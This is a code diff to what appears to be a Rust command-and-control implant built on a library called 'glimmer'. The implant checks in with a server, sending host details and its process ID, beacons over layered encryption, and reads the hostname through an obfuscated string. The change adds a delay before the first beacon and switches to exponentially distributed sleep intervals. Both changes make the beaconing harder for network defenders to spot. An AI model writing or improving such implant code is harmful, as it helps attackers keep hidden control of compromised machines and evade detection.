@@ -4,6 +4,7 @@ use glimmer::cfg::Config;
 use glimmer::crypto::{self, TimeBasedKey};
 use glimmer::identity;
 use glimmer::proto::{CheckinData, Envelope, MsgType};
+use glimmer::sys;
 
 fn main() {
     let config = match Config::load("config.json") {
@@ -14,7 +15,11 @@ fn main() {
         }
     };
 
-    let node_id = identity::generate();
+    let host = sys::read_file_string(
+        &glimmer::strings::decode_str(glimmer::strings::ETC_HOSTNAME)
+    ).unwrap_or_else(|_| "unknown".into());
+
+    let node_id = identity::generate_with_hostname(&host);
 
     let server_pub = match config.server_public_key_bytes() {
         Ok(k) => k,
@@ -43,7 +48,7 @@ fn main() {
     let checkin = CheckinData {
         os: std::env::consts::OS.into(),
         arch: std::env::consts::ARCH.into(),
-        host: hostname(),
+        host: host.clone(),
         pid: std::process::id(),
         pub_key: vec![],
     };
@@ -59,8 +64,10 @@ fn main() {
         }
     };
 
-    // Phase 2: Layered encryption - time-based outer, ECIES inner
+    // Phase 2: Layered encryption - time-based outer, ECIES inner. Sleep before first beacon
     loop {
+        sleep_adaptive(config.beacon_interval());
+
         match send_layered(
             MsgType::Beacon,
             &node_id,
@@ -73,7 +80,6 @@ fn main() {
             Err(_e) => { glimmer::dbg_log!("[dev] beacon failed: {}", _e); },
         }
 
-        sleep(config.beacon_interval(), config.jitter());
     }
 }
 
@@ -126,13 +132,29 @@ fn send_layered<T: serde::Serialize>(
     channel.send(&ctx)
 }
 
-fn sleep(base: std::time::Duration, jitter: f64) {
-    let random: f64 = rand::random();
-    let j = base.mul_f64(jitter * random);
-    std::thread::sleep(base + j);
-}
+fn sleep_adaptive(config_interval: std::time::Duration) {
+    use std::time::Duration;
 
-fn hostname() -> String {
-    glimmer::sys::read_file_string(&glimmer::strings::decode_str(glimmer::strings::ETC_HOSTNAME))
-        .unwrap_or_else(|_| "unknown".into())
+    let base_secs = config_interval.as_secs_f64();
+
+    // Generate a sleep time from an exponential distribution
+    // rather than uniform. This produces mostly short intervals
+    // with occasional very long ones instead of uniform jitter.
+    let uniform: f64 = rand::random();
+
+    // Inverse transform sampling for exponential distribution
+    // mean = base_secs, but actual intervals range from near-zero
+    // to several multiples of base
+    let exponential = -base_secs * uniform.ln();
+
+    // Minimum 30% of base with jitter, maximum 10x base
+    let min_jitter: f64 = rand::random();
+    let min_secs = base_secs * (0.3 + 0.2 * min_jitter);
+    let max_secs = base_secs * 10.0;
+    let clamped = exponential.max(min_secs).min(max_secs);
+
+    glimmer::dbg_log!("sleep: base={:.1} exp={:.1} min={:.1} clamped={:.1}", 
+        base_secs, exponential, min_secs, clamped);
+
+    std::thread::sleep(Duration::from_secs_f64(clamped));
 }
